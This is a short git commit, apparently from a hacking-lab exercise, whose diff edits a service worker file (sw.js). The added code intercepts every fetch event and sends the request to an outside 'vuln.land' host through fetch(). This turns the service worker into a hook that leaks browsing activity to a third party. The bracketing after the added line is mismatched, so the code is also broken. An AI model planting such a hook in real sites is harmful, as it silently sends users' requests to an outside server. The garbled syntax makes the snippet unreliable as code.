2bf091e9b9adab56c61dfb6ae6a4a0000f331af6
Josef Ilg <jo-ilg@t-online.de>
2021-05-19 23:35:21 +0200

    4

--- sw.js
+++ sw.js
@@ -1,5 +1,6 @@
 self.addEventListener('fetch', function(e) {
   e.respondWith(caches.match(e.request).then(function(response) {
-	  "blabla"
-})
-
+	  fetch('http://888f69e5-7431-4c41-a3ef-b0e538d33c4b.idocker.vuln.land/robots.txt?b='+e.request)
+  });
+  );
+});
